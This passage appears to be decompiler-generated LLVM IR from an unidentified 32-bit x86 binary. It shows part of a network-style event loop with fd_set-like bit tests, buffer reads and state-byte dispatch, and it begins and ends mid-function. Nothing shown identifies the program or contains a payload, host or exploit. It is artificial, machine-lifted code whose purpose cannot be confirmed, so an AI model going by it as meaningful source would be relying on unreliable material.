  %v9_8048cc0 = shl i32 1, %v1_8048cba
  %v12_8048cc0 = or i32 %v6_8048cc0, %v9_8048cc0
  store i32 %v12_8048cc0, i32* %v5_8048cc0, align 4
  %v0_8048cc8 = load i32, i32* @esi, align 4
  %v1_8048cc8 = add i32 %v0_8048cc8, -1440
  %v2_8048cc8 = inttoptr i32 %v1_8048cc8 to i32*
  %v3_8048cc8 = load i32, i32* %v2_8048cc8, align 4
  store i32 %v3_8048cc8, i32* %eax.global-to-local, align 4
  %v0_8048cce = load i32, i32* @esp, align 4
  %v1_8048cce = add i32 %v0_8048cce, 72
  %v2_8048cce = inttoptr i32 %v1_8048cce to i32*
  %v3_8048cce = load i32, i32* %v2_8048cce, align 4
  %v5_8048cce = sub i32 %v3_8048cce, %v3_8048cc8
  %v11_8048cce = xor i32 %v3_8048cce, %v3_8048cc8
  %v12_8048cce = xor i32 %v5_8048cce, %v3_8048cce
  %v13_8048cce = and i32 %v12_8048cce, %v11_8048cce
  %v14_8048cce = icmp slt i32 %v13_8048cce, 0
  %v15_8048cce = icmp eq i32 %v5_8048cce, 0
  store i1 %v15_8048cce, i1* %zf.global-to-local, align 1
  %v16_8048cce = icmp slt i32 %v5_8048cce, 0
  %v2_8048cd2 = icmp eq i1 %v16_8048cce, %v14_8048cce
  br i1 %v2_8048cd2, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048582
  %v1_8048cdd = add i32 %v0_8048597, 72
  %v2_8048cdd = inttoptr i32 %v1_8048cdd to i32*
  %v3_8048cdd = load i32, i32* %v2_8048cdd, align 4
  store i32 %v3_8048cdd, i32* %eax.global-to-local, align 4
  %v1_8048ce1 = icmp eq i32 %v3_8048cdd, 0
  store i1 %v1_8048ce1, i1* %zf.global-to-local, align 1
  br i1 %v1_8048ce1, label %dec_label_pc_80484e5, label %dec_label_pc_8048ce9

dec_label_pc_8048ce9:                             ; preds = %dec_label_pc_8048cdd
  %v1_8048ce9 = add i32 %v0_8048597, 20888
  %v2_8048ce9 = inttoptr i32 %v1_8048ce9 to i32*
  store i32 0, i32* %v2_8048ce9, align 4
  %v0_8048cf4 = load i32, i32* @esp, align 4
  %v1_8048cf4 = add i32 %v0_8048cf4, 20884
  %v2_8048cf4 = inttoptr i32 %v1_8048cf4 to i32*
  store i32 1, i32* %v2_8048cf4, align 4
  %v0_8048cff = load i32, i32* @esp, align 4
  %v9_8048cff = icmp eq i32 %v0_8048cff, 12
  store i1 %v9_8048cff, i1* %zf.global-to-local, align 1
  %v1_8048d02 = add i32 %v0_8048cff, 20884
  store i32 %v1_8048d02, i32* %eax.global-to-local, align 4
  %v2_8048d09 = add i32 %v0_8048cff, -16
  %v3_8048d09 = inttoptr i32 %v2_8048d09 to i32*
  store i32 %v1_8048d02, i32* %v3_8048d09, align 4
  %v1_8048d0a = add i32 %v0_8048cff, -20
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 0, i32* %v2_8048d0a, align 4
  %v1_8048d0c = add i32 %v0_8048cff, 20612
  store i32 %v1_8048d0c, i32* %edx.global-to-local, align 4
  %v2_8048d13 = add i32 %v0_8048cff, -24
  %v3_8048d13 = inttoptr i32 %v2_8048d13 to i32*
  store i32 %v1_8048d0c, i32* %v3_8048d13, align 4
  %v1_8048d14 = add i32 %v0_8048cff, 20740
  store i32 %v1_8048d14, i32* %ecx.global-to-local, align 4
  %v2_8048d1b = add i32 %v0_8048cff, -28
  %v3_8048d1b = inttoptr i32 %v2_8048d1b to i32*
  store i32 %v1_8048d14, i32* %v3_8048d1b, align 4
  %v1_8048d1c = add i32 %v0_8048cff, 72
  %v2_8048d1c = inttoptr i32 %v1_8048d1c to i32*
  %v3_8048d1c = load i32, i32* %v2_8048d1c, align 4
  store i32 %v3_8048d1c, i32* %eax.global-to-local, align 4
  %v2_8048d20 = add i32 %v0_8048cff, -32
  %v3_8048d20 = inttoptr i32 %v2_8048d20 to i32*
  store i32 %v3_8048d1c, i32* %v3_8048d20, align 4
  %v0_8048d21 = call i32 @function_80523e8()
  store i32 %v0_8048d21, i32* %eax.global-to-local, align 4
  %v0_8048d26 = load i32, i32* @esp, align 4
  %v9_8048d26 = icmp eq i32 %v0_8048d26, -20
  store i1 %v9_8048d26, i1* %zf.global-to-local, align 1
  store i32 %v0_8048d21, i32* @ebx, align 4
  %v1_8048d2b = add i32 %v0_8048d26, 16
  %v2_8048d2b = inttoptr i32 %v1_8048d2b to i32*
  store i32 0, i32* %v2_8048d2b, align 4
  %v2_8048d2d = call i32 @function_80524a2(i32* %v1_80484ea)
  store i32 %v2_8048d2d, i32* %eax.global-to-local, align 4
  %v1_8048d32 = load i32, i32* @esp, align 4
  %v2_8048d32 = add i32 %v1_8048d32, 132
  %v3_8048d32 = inttoptr i32 %v2_8048d32 to i32*
  store i32 %v2_8048d2d, i32* %v3_8048d32, align 4
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 16
  %v0_8048d3c = load i32, i32* @ebx, align 4
  %v1_8048d3c = icmp eq i32 %v0_8048d3c, 0
  store i1 %v1_8048d3c, i1* %zf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v0_8048d3c, 1
  br i1 %tmp141, label %dec_label_pc_80484e5, label %dec_label_pc_8048d44

dec_label_pc_8048d44:                             ; preds = %dec_label_pc_8048ce9
  %v1_8048d44 = add i32 %v0_8048d39, 48
  %v2_8048d44 = inttoptr i32 %v1_8048d44 to i32*
  %v3_8048d44 = load i32, i32* %v2_8048d44, align 4
  store i32 %v3_8048d44, i32* %eax.global-to-local, align 4
  %v1_8048d48 = add i32 %v0_8048d39, 60
  %v2_8048d48 = inttoptr i32 %v1_8048d48 to i32*
  store i32 0, i32* %v2_8048d48, align 4
  %v0_8048d50 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048d50, i32* %edx.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, 92
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d50, i32* %v3_8048d52, align 4
  %v0_8048db9.pre = load i32, i32* @esp, align 4
  %v0_8048dbd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048d58:                             ; preds = %dec_label_pc_8048dd2, %dec_label_pc_8048e2e
  %v1_8048e7a = phi i32 [ %v0_8048ddc, %dec_label_pc_8048dd2 ], [ %v0_8048d60.pre, %dec_label_pc_8048e2e ]
  %v0_8048d58 = phi i32 [ %v3_8048dc7, %dec_label_pc_8048dd2 ], [ %v0_8048d58.pre, %dec_label_pc_8048e2e ]
  %v2_8048d5a = udiv i32 %v0_8048d58, 32
  store i32 %v2_8048d5a, i32* %ecx.global-to-local, align 4
  %v1_8048d5d = urem i32 %v0_8048d58, 32
  store i32 %v1_8048d5d, i32* %eax.global-to-local, align 4
  %v2_8048d60 = mul nuw nsw i32 %v2_8048d5a, 4
  %v3_8048d60 = add i32 %v1_8048e7a, 20740
  %v4_8048d60 = add i32 %v3_8048d60, %v2_8048d60
  %v5_8048d60 = inttoptr i32 %v4_8048d60 to i32*
  %v6_8048d60 = load i32, i32* %v5_8048d60, align 4
  %v9_8048d60 = shl i32 1, %v1_8048d5d
  %v10_8048d60 = and i32 %v6_8048d60, %v9_8048d60
  %v11_8048d60 = icmp ne i32 %v10_8048d60, 0
  %v1_8048d68 = zext i1 %v11_8048d60 to i32
  store i32 %v1_8048d68, i32* %eax.global-to-local, align 4
  %v4_8048d6b = icmp eq i1 %v11_8048d60, false
  store i1 %v4_8048d6b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048d6b, label %dec_label_pc_8048d91, label %dec_label_pc_8048d6f

dec_label_pc_8048d6f:                             ; preds = %dec_label_pc_8048d58
  %v1_8048d6f = add i32 %v1_8048e7a, 92
  %v2_8048d6f = inttoptr i32 %v1_8048d6f to i32*
  %v3_8048d6f = load i32, i32* %v2_8048d6f, align 4
  store i32 %v3_8048d6f, i32* %edx.global-to-local, align 4
  %v1_8048d73 = add i32 %v3_8048d6f, -1448
  %v2_8048d73 = inttoptr i32 %v1_8048d73 to i8*
  %v3_8048d73 = load i8, i8* %v2_8048d73, align 1
  %v4_8048d73 = zext i8 %v3_8048d73 to i32
  store i32 %v4_8048d73, i32* @eax, align 4
  %v10_8048d79 = icmp eq i8 %v3_8048d73, 6
  store i1 %v10_8048d79, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d79, label %dec_label_pc_8048e7a, label %dec_label_pc_8048d81

dec_label_pc_8048d81:                             ; preds = %dec_label_pc_8048d6f
  %v10_8048d81 = icmp eq i8 %v3_8048d73, 7
  store i1 %v10_8048d81, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d81, label %dec_label_pc_80494af, label %dec_label_pc_8048d89

dec_label_pc_8048d89:                             ; preds = %dec_label_pc_8048d81
  %v10_8048d89 = icmp eq i8 %v3_8048d73, 10
  store i1 %v10_8048d89, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d89, label %dec_label_pc_80497b3, label %dec_label_pc_8048d91

dec_label_pc_8048d91:                             ; preds = %dec_label_pc_80495e0, %dec_label_pc_8049b0f, %dec_label_pc_8049c31, %dec_label_pc_8049ae5, %dec_label_pc_8048d89, %dec_label_pc_8048d58, %dec_label_pc_8048db9, %dec_label_pc_8049e5a, %dec_label_pc_8049c42, %dec_label_pc_8049af8, %dec_label_pc_8049abf, %dec_label_pc_8049a49, %dec_label_pc_80497f9, %dec_label_pc_804949f, %dec_label_pc_8048e4a, %dec_label_pc_80496c3
  %v0_8048d91 = load i32, i32* @esp, align 4
  %v1_8048d91 = add i32 %v0_8048d91, 44
  %v2_8048d91 = inttoptr i32 %v1_8048d91 to i32*
  %v3_8048d91 = load i32, i32* %v2_8048d91, align 4
  store i32 %v3_8048d91, i32* %edx.global-to-local, align 4
  %v1_8048d95 = add i32 %v0_8048d91, 92
  %v2_8048d95 = inttoptr i32 %v1_8048d95 to i32*
  %v3_8048d95 = load i32, i32* %v2_8048d95, align 4
  %v1_8048d99 = add i32 %v3_8048d95, 3140
  store i32 %v1_8048d99, i32* %eax.global-to-local, align 4
  %v1_8048d9e = add i32 %v3_8048d91, 1
  store i32 %v1_8048d9e, i32* %edx.global-to-local, align 4
  store i32 %v1_8048d9e, i32* %v2_8048d91, align 4
  %v0_8048da3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048da3 = load i32, i32* @esp, align 4
  %v2_8048da3 = add i32 %v1_8048da3, 92
  %v3_8048da3 = inttoptr i32 %v2_8048da3 to i32*
  store i32 %v0_8048da3, i32* %v3_8048da3, align 4
  %v0_8048da7 = load i32, i32* @esp, align 4
  %v1_8048da7 = add i32 %v0_8048da7, 112
  %v2_8048da7 = inttoptr i32 %v1_8048da7 to i32*
  %v3_8048da7 = load i32, i32* %v2_8048da7, align 4
  store i32 %v3_8048da7, i32* %eax.global-to-local, align 4
  %v1_8048dab = add i32 %v0_8048da7, 44
  %v2_8048dab = inttoptr i32 %v1_8048dab to i32*
  %v3_8048dab = load i32, i32* %v2_8048dab, align 4
  %v15_8048dab = icmp eq i32 %v3_8048dab, %v3_8048da7
  store i1 %v15_8048dab, i1* %zf.global-to-local, align 1
  br i1 %v15_8048dab, label %dec_label_pc_80484e5, label %dec_label_pc_8048db5

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d91
  %v1_8048db5 = add i32 %v0_8048da7, 92
  %v2_8048db5 = inttoptr i32 %v1_8048db5 to i32*
  %v3_8048db5 = load i32, i32* %v2_8048db5, align 4
  store i32 %v3_8048db5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048db9:                             ; preds = %dec_label_pc_8048d44, %dec_label_pc_8048db5
  %v0_8048dbd = phi i32 [ %v0_8048dbd.pre, %dec_label_pc_8048d44 ], [ %v3_8048db5, %dec_label_pc_8048db5 ]
  %v1_8048dc3 = phi i32 [ %v0_8048db9.pre, %dec_label_pc_8048d44 ], [ %v0_8048da7, %dec_label_pc_8048db5 ]
  %v1_8048db9 = add i32 %v1_8048dc3, 92
  %v2_8048db9 = inttoptr i32 %v1_8048db9 to i32*
  %v3_8048db9 = load i32, i32* %v2_8048db9, align 4
  store i32 %v3_8048db9, i32* %eax.global-to-local, align 4
  %v1_8048dbd = add i32 %v0_8048dbd, -1452
  store i32 %v1_8048dbd, i32* %edx.global-to-local, align 4
  %v2_8048dc3 = add i32 %v1_8048dc3, 76
  %v3_8048dc3 = inttoptr i32 %v2_8048dc3 to i32*
  store i32 %v1_8048dbd, i32* %v3_8048dc3, align 4
  %v0_8048dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048dc7 = add i32 %v0_8048dc7, -1452
  %v2_8048dc7 = inttoptr i32 %v1_8048dc7 to i32*
  %v3_8048dc7 = load i32, i32* %v2_8048dc7, align 4
  store i32 %v3_8048dc7, i32* %ecx.global-to-local, align 4
  %v10_8048dcd = icmp eq i32 %v3_8048dc7, -1
  store i1 %v10_8048dcd, i1* %zf.global-to-local, align 1
  br i1 %v10_8048dcd, label %dec_label_pc_8048d91, label %dec_label_pc_8048dd2

dec_label_pc_8048dd2:                             ; preds = %dec_label_pc_8048db9
  %v2_8048dd6 = udiv i32 %v3_8048dc7, 32
  store i32 %v2_8048dd6, i32* %edx.global-to-local, align 4
  %v1_8048dd9 = urem i32 %v3_8048dc7, 32
  store i32 %v1_8048dd9, i32* %eax.global-to-local, align 4
  %v0_8048ddc = load i32, i32* @esp, align 4
  %v2_8048ddc = mul nuw nsw i32 %v2_8048dd6, 4
  %v3_8048ddc = add nuw nsw i32 %v2_8048ddc, 20612
  %v4_8048ddc = add i32 %v3_8048ddc, %v0_8048ddc
  %v5_8048ddc = inttoptr i32 %v4_8048ddc to i32*
  %v6_8048ddc = load i32, i32* %v5_8048ddc, align 4
  %v9_8048ddc = shl i32 1, %v1_8048dd9
  %v10_8048ddc = and i32 %v6_8048ddc, %v9_8048ddc
  %v11_8048ddc = icmp ne i32 %v10_8048ddc, 0
  %v1_8048de4 = zext i1 %v11_8048ddc to i32
  store i32 %v1_8048de4, i32* %eax.global-to-local, align 4
  %v4_8048de7 = icmp eq i1 %v11_8048ddc, false
  store i1 %v4_8048de7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048de7, label %dec_label_pc_8048d58, label %dec_label_pc_8048def

dec_label_pc_8048def:                             ; preds = %dec_label_pc_8048dd2
  %v1_8048def = add i32 %v0_8048ddc, 20896
  %v2_8048def = inttoptr i32 %v1_8048def to i32*
  store i32 0, i32* %v2_8048def, align 4
  %v0_8048dfa = load i32, i32* @esp, align 4
  %v1_8048dfa = add i32 %v0_8048dfa, 20892
  %v2_8048dfa = inttoptr i32 %v1_8048dfa to i32*
  store i32 4, i32* %v2_8048dfa, align 4
  %v0_8048e05 = load i32, i32* @esp, align 4
  %v9_8048e05 = icmp eq i32 %v0_8048e05, 12
  store i1 %v9_8048e05, i1* %zf.global-to-local, align 1
  %v1_8048e08 = add i32 %v0_8048e05, 20892
  store i32 %v1_8048e08, i32* %edx.global-to-local, align 4
  %v2_8048e0f = add i32 %v0_8048e05, -16
  %v3_8048e0f = inttoptr i32 %v2_8048e0f to i32*
  store i32 %v1_8048e08, i32* %v3_8048e0f, align 4
  %v1_8048e10 = add i32 %v0_8048e05, 20896
  store i32 %v1_8048e10, i32* %eax.global-to-local, align 4
  %v2_8048e17 = add i32 %v0_8048e05, -20
  %v3_8048e17 = inttoptr i32 %v2_8048e17 to i32*
  store i32 %v1_8048e10, i32* %v3_8048e17, align 4
  %v1_8048e18 = add i32 %v0_8048e05, -24
  %v2_8048e18 = inttoptr i32 %v1_8048e18 to i32*
  store i32 4, i32* %v2_8048e18, align 4
  %v1_8048e1a = add i32 %v0_8048e05, -28
  %v2_8048e1a = inttoptr i32 %v1_8048e1a to i32*
  store i32 1, i32* %v2_8048e1a, align 4
  %v0_8048e1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048e1c = add i32 %v0_8048e05, -32
  %v3_8048e1c = inttoptr i32 %v2_8048e1c to i32*
  store i32 %v0_8048e1c, i32* %v3_8048e1c, align 4
  %v0_8048e1d = call i32 @function_8052850()
  store i32 %v0_8048e1d, i32* %eax.global-to-local, align 4
  %v0_8048e22 = load i32, i32* @esp, align 4
  %v1_8048e22 = add i32 %v0_8048e22, 32
  %v2_8048e25 = add i32 %v0_8048e22, 20928
  %v3_8048e25 = inttoptr i32 %v2_8048e25 to i32*
  %v4_8048e25 = load i32, i32* %v3_8048e25, align 4
  %v5_8048e25 = or i32 %v4_8048e25, %v0_8048e1d
  %v6_8048e25 = icmp eq i32 %v5_8048e25, 0
  store i1 %v6_8048e25, i1* %zf.global-to-local, align 1
  store i32 %v5_8048e25, i32* %eax.global-to-local, align 4
  %v1_8048e2c = icmp eq i1 %v6_8048e25, false
  br i1 %v1_8048e2c, label %dec_label_pc_8048e4a, label %dec_label_pc_8048e2e

dec_label_pc_8048e2e:                             ; preds = %dec_label_pc_8048def
  %v1_8048e2e = add i32 %v0_8048e22, 124
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  store i32 %v3_8048e2e, i32* %edx.global-to-local, align 4
  %v1_8048e32 = add i32 %v3_8048e2e, -1452
  %v2_8048e32 = inttoptr i32 %v1_8048e32 to i32*
  %v3_8048e32 = load i32, i32* %v2_8048e32, align 4
  store i32 %v3_8048e32, i32* %ecx.global-to-local, align 4
  %v1_8048e38 = add i32 %v3_8048e2e, -1448
  %v2_8048e38 = inttoptr i32 %v1_8048e38 to i8*
  store i8 4, i8* %v2_8048e38, align 1
  %v0_8048d58.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8048d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048d58

dec_label_pc_8048e44:                             ; preds = %dec_label_pc_80494dc
  %v0_8048e44 = load i32, i32* @edi, align 4
  %v1_8048e44 = inttoptr i32 %v0_8048e44 to i32*
  store i32 104, i32* %v1_8048e44, align 4
  %v0_8048e4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e4a

dec_label_pc_8048e4a:                             ; preds = %dec_label_pc_8049b0f, %dec_label_pc_8048e7a, %dec_label_pc_8048def, %dec_label_pc_8048e44
  %v0_8048e4a = phi i32 [ %v1_804950d, %dec_label_pc_8049b0f ], [ %v1_8048eb7, %dec_label_pc_8048e7a ], [ %v1_8048e22, %dec_label_pc_8048def ], [ %v0_8048e4a.pre, %dec_label_pc_8048e44 ]
  %v9_8048e4a = icmp eq i32 %v0_8048e4a, 12
  store i1 %v9_8048e4a, i1* %zf.global-to-local, align 1
  %v1_8048e4d = add i32 %v0_8048e4a, 92
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  store i32 %v3_8048e4d, i32* %ecx.global-to-local, align 4
  %v1_8048e51 = add i32 %v3_8048e4d, -1452
  %v2_8048e51 = inttoptr i32 %v1_8048e51 to i32*
  %v3_8048e51 = load i32, i32* %v2_8048e51, align 4
  store i32 %v3_8048e51, i32* @ebx, align 4
  %v2_8048e57 = add i32 %v0_8048e4a, -16
  %v3_8048e57 = inttoptr i32 %v2_8048e57 to i32*
  store i32 %v3_8048e51, i32* %v3_8048e57, align 4
  %v1_8048e58 = call i32 @function_80521e1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048e58, i32* %eax.global-to-local, align 4
  %v0_8048e5d = load i32, i32* @esp, align 4
  %v1_8048e5d = add i32 %v0_8048e5d, 108
  %v2_8048e5d = inttoptr i32 %v1_8048e5d to i32*
  %v3_8048e5d = load i32, i32* %v2_8048e5d, align 4
  store i32 %v3_8048e5d, i32* %eax.global-to-local, align 4
  %v6_8048e61 = icmp eq i32 %v0_8048e5d, -16
  store i1 %v6_8048e61, i1* %zf.global-to-local, align 1
  %v1_8048e64 = add i32 %v3_8048e5d, -1452
  %v2_8048e64 = inttoptr i32 %v1_8048e64 to i32*
  store i32 -1, i32* %v2_8048e64, align 4
  %v0_8048e6e = load i32, i32* %eax.global-to-local, align 4
  %v1_8048e6e = add i32 %v0_8048e6e, -1448
  %v2_8048e6e = inttoptr i32 %v1_8048e6e to i8*
  store i8 0, i8* %v2_8048e6e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048d6f
  %v2_8048e7a = add i32 %v1_8048e7a, -4
  %v3_8048e7a = inttoptr i32 %v2_8048e7a to i32*
  store i32 %v4_8048d73, i32* %v3_8048e7a, align 4
  %v0_8048e7b = load i32, i32* @eax, align 4
  %v2_8048e7b = add i32 %v1_8048e7a, -8
  %v3_8048e7b = inttoptr i32 %v2_8048e7b to i32*
  store i32 %v0_8048e7b, i32* %v3_8048e7b, align 4
  %v1_8048e7c = add i32 %v1_8048e7a, -12
  %v2_8048e7c = inttoptr i32 %v1_8048e7c to i32*
  store i32 10240, i32* %v2_8048e7c, align 4
  %v1_8048e81 = add i32 %v1_8048e7a, 131
  store i32 %v1_8048e81, i32* %ecx.global-to-local, align 4
  %v2_8048e88 = add i32 %v1_8048e7a, -16
  %v3_8048e88 = inttoptr i32 %v2_8048e88 to i32*
  store i32 %v1_8048e81, i32* %v3_8048e88, align 4
  %v2_8048e89 = call i32 @function_8051cd0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  %v0_8048e8e = load i32, i32* @esp, align 4
  %v1_8048e8e = add i32 %v0_8048e8e, -4
  %v2_8048e8e = inttoptr i32 %v1_8048e8e to i32*
  store i32 16386, i32* %v2_8048e8e, align 4
  %v1_8048e93 = add i32 %v0_8048e8e, -8
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  store i32 10240, i32* %v2_8048e93, align 4
  %v1_8048e98 = add i32 %v0_8048e8e, 147
  store i32 %v1_8048e98, i32* %eax.global-to-local, align 4
  %v2_8048e9f = add i32 %v0_8048e8e, -12
  %v3_8048e9f = inttoptr i32 %v2_8048e9f to i32*
  store i32 %v1_8048e98, i32* %v3_8048e9f, align 4
  %v1_8048ea0 = add i32 %v0_8048e8e, 108
  %v2_8048ea0 = inttoptr i32 %v1_8048ea0 to i32*
  %v3_8048ea0 = load i32, i32* %v2_8048ea0, align 4
  store i32 %v3_8048ea0, i32* %edx.global-to-local, align 4
  %v1_8048ea4 = add i32 %v3_8048ea0, -1452
  %v2_8048ea4 = inttoptr i32 %v1_8048ea4 to i32*
  %v3_8048ea4 = load i32, i32* %v2_8048ea4, align 4
  store i32 %v3_8048ea4, i32* %eax.global-to-local, align 4
  %v2_8048eaa = add i32 %v0_8048e8e, -16
  %v3_8048eaa = inttoptr i32 %v2_8048eaa to i32*
  store i32 %v3_8048ea4, i32* %v3_8048eaa, align 4
  %v0_8048eab = call i32 @function_80528ae()
  store i32 %v0_8048eab, i32* %eax.global-to-local, align 4
  %v1_8048eb0 = load i32, i32* @esp, align 4
  %v2_8048eb0 = add i32 %v1_8048eb0, 136
  %v3_8048eb0 = inttoptr i32 %v2_8048eb0 to i32*
  store i32 %v0_8048eab, i32* %v3_8048eb0, align 4
  %v0_8048eb7 = load i32, i32* @esp, align 4
  %v1_8048eb7 = add i32 %v0_8048eb7, 32
  %v1_8048eba = icmp eq i32 %v0_8048eab, 0
  store i1 %v1_8048eba, i1* %zf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v0_8048eab, 1
  br i1 %tmp142, label %dec_label_pc_8048e4a, label %dec_label_pc_8048ebe

dec_label_pc_8048ebe:                             ; preds = %dec_label_pc_8048e7a
  %v1_8048ebe = add i32 %v0_8048eb7, 28
  %v2_8048ebe = inttoptr i32 %v1_8048ebe to i32*
  store i32 4, i32* %v2_8048ebe, align 4
  %v1_8048ec0 = add i32 %v0_8048eb7, 24
  %v2_8048ec0 = inttoptr i32 %v1_8048ec0 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b04.13 to i32), i32* %v2_8048ec0, align 4
  %v1_8048ec5 = add i32 %v0_8048eb7, 136
  %v2_8048ec5 = inttoptr i32 %v1_8048ec5 to i32*
  %v3_8048ec5 = load i32, i32* %v2_8048ec5, align 4
  store i32 %v3_8048ec5, i32* %eax.global-to-local, align 4
  %v2_8048ec9 = add i32 %v0_8048eb7, 20
  %v3_8048ec9 = inttoptr i32 %v2_8048ec9 to i32*
  store i32 %v3_8048ec5, i32* %v3_8048ec9, align 4
  %v1_8048eca = add i32 %v0_8048eb7, 163
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  %v2_8048ed1 = add i32 %v0_8048eb7, 16
  %v3_8048ed1 = inttoptr i32 %v2_8048ed1 to i32*
  store i32 %v1_8048eca, i32* %v3_8048ed1, align 4
  %v0_8048ed2 = call i32 @function_8051cf0()
  %v0_8048ed7 = load i32, i32* @esp, align 4
  %v1_8048eda = add i32 %v0_8048ed2, 1
  %v8_8048eda = icmp eq i32 %v1_8048eda, 0
  store i1 %v8_8048eda, i1* %zf.global-to-local, align 1
  store i32 %v1_8048eda, i32* %eax.global-to-local, align 4
  %v1_8049ae5 = add i32 %v0_8048ed7, 120
  %v2_8049ae5 = inttoptr i32 %v1_8049ae5 to i32*
  br i1 %v8_8048eda, label %dec_label_pc_8049ae5, label %dec_label_pc_8048ee1

dec_label_pc_8048ee1:                             ; preds = %dec_label_pc_8048ebe, %dec_label_pc_8049ae5
  %v1_8048ee1 = add i32 %v0_8048ed7, 12
  %v2_8048ee1 = inttoptr i32 %v1_8048ee1 to i32*
  store i32 4, i32* %v2_8048ee1, align 4
  %v1_8048ee3 = add i32 %v0_8048ed7, 8
  %v2_8048ee3 = inttoptr i32 %v1_8048ee3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b04.13 to i32), i32* %v2_8048ee3, align 4
  %v3_8048ee8 = load i32, i32* %v2_8049ae5, align 4
  %v2_8048eec = add i32 %v0_8048ed7, 4
  %v3_8048eec = inttoptr i32 %v2_8048eec to i32*
  store i32 %v3_8048ee8, i32* %v3_8048eec, align 4
  %v1_8048eed = add i32 %v0_8048ed7, 147
  store i32 %v1_8048eed, i32* %ecx.global-to-local, align 4
  %v3_8048ef4 = inttoptr i32 %v0_8048ed7 to i32*
  store i32 %v1_8048eed, i32* %v3_8048ef4, align 4
  %v0_8048ef5 = call i32 @function_8051cf0()
  store i32 %v0_8048ef5, i32* %eax.global-to-local, align 4
  %v0_8048efa = load i32, i32* @esp, align 4
  %v2_8048efa = add i32 %v0_8048ef5, 147
  %v3_8048efa = add i32 %v2_8048efa, %v0_8048efa
  %v4_8048efa = inttoptr i32 %v3_8048efa to i8*
  store i8 0, i8* %v4_8048efa, align 1
  %v0_8048f02 = load i32, i32* @esp, align 4
  %v1_8048f02 = inttoptr i32 %v0_8048f02 to i32*
  %v3_8048f02 = add i32 %v0_8048f02, 4
  %v1_8048f03 = inttoptr i32 %v3_8048f02 to i32*
  %v2_8048f03 = load i32, i32* %v1_8048f03, align 4
  store i32 %v2_8048f03, i32* @edi, align 4
  store i32 0, i32* %v1_8048f03, align 4
  store i32 46, i32* %v1_8048f02, align 4
  %v3_8048f08 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f08, i32* %eax.global-to-local, align 4
  %v0_8048f0d = load i32, i32* @esp, align 4
  %v9_8048f0d = icmp eq i32 %v0_8048f0d, -12
  store i1 %v9_8048f0d, i1* %zf.global-to-local, align 1
  %v2_8048f10 = add i32 %v0_8048f0d, 8
  %v3_8048f10 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v3_8048f08, i32* %v3_8048f10, align 4
  %v1_8048f11 = add i32 %v0_8048f0d, 120
  %v2_8048f11 = inttoptr i32 %v1_8048f11 to i32*
  %v3_8048f11 = load i32, i32* %v2_8048f11, align 4
  %v2_8048f15 = add i32 %v0_8048f0d, 4
  %v3_8048f15 = inttoptr i32 %v2_8048f15 to i32*
  store i32 %v3_8048f11, i32* %v3_8048f15, align 4
  %v1_8048f16 = add i32 %v0_8048f0d, 147
  store i32 %v1_8048f16, i32* %eax.global-to-local, align 4
  %v3_8048f1d = inttoptr i32 %v0_8048f0d to i32*
  store i32 %v1_8048f16, i32* %v3_8048f1d, align 4
  %v4_8048f1e = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f23 = load i32, i32* @esp, align 4
  %v1_8048f23 = add i32 %v0_8048f23, 16
  %v1_8048f26 = add i32 %v4_8048f1e, 1
  %v8_8048f26 = icmp eq i32 %v1_8048f26, 0
  store i1 %v8_8048f26, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f26, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f26, label %dec_label_pc_8048f33, label %dec_label_pc_8048f29

dec_label_pc_8048f29:                             ; preds = %dec_label_pc_8048ee1
  %v1_8048f29 = add i32 %v0_8048f23, 108
  %v2_8048f29 = inttoptr i32 %v1_8048f29 to i32*
  %v3_8048f29 = load i32, i32* %v2_8048f29, align 4
  store i32 %v3_8048f29, i32* %edx.global-to-local, align 4
  %v1_8048f2d = inttoptr i32 %v3_8048f29 to i32*
  store i32 2, i32* %v1_8048f2d, align 4
  %v1_8048f33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f33

dec_label_pc_8048f33:                             ; preds = %dec_label_pc_8048ee1, %dec_label_pc_8048f29
